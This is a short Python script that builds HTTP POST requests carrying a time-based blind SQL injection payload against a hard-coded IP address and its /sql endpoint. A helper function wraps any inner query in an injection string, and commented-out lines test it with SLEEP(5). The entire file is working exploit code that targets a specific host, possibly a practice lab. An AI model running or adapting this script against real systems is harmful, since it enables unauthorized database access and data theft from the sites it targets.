import requests


def set_payload(payload):
    headers = {
        'Host': '43.138.109.28:8080',
        # 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '72',
        'Origin': 'http://43.138.109.28:8080',
        'Connection': 'close',
        'Referer': 'http://43.138.109.28:8080/sql',
        'Upgrade-Insecure-Requests': '1'
    }

    data = "name=aaa' AND (SELECT 8741 FROM (SELECT({0}))MgBp) AND 'XbPu'='XbPu".format(payload)

    return data, headers


# url = "http://43.138.109.28:8080/sql"
# payload = "(SELECT 8741 FROM (SELECT(SLEEP(5)))MgBp)"
# data, headers = set_payload(payload)
# print(data)
#
# response = requests.request("POST", url, data=data, headers=headers)

# print(response.text)

